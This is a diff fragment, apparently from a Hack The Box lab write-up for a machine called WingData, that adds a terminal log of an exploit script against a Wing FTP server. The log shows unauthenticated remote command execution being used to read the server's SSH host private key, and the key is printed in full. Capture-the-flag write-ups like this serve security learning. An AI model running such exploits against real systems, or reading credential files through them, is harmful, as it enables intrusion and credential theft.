@@ -386,4 +386,20 @@ vR0xq1V8fWBcRKspxLBgt7rk1Al9Vw==
 ----------------------
 ```
 
+```
+(venv) ajdev@rootbox:~/HTB/WingData$ python3 exploitdb.py -u http://ftp.wingdata.htb -c "cat /opt/wftpserver/Data/ssh_host_ecdsa_key"
+
+[*] Testing target: http://ftp.wingdata.htb
+[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'cat /opt/wftpserver/Data/ssh_host_ecdsa_key' and username: 'anonymous'
+[+] UID extracted: 1c63e214e37362a879c164d3b4402553f528764d624db129b32c21fbca0cb8d6
+[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 1c63e214e37362a879c164d3b4402553f528764d624db129b32c21fbca0cb8d6
+
+--- Command Output ---
+-----BEGIN PRIVATE KEY-----
+MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgQi9rTL6fS2Ehkzbx
+szBUWz+6Sl91XETiFdQlhJj5gmuhRANCAARODo05vFXlRJk/aw0csXW7ee0fDWQ8
+XkMZG9gpr5WZstPaTJqvAVbJvl6NgrPgrCMgOqrC3z2CgZKys5vQhMLa
+-----END PRIVATE KEY-----
+----------------------
+```
 
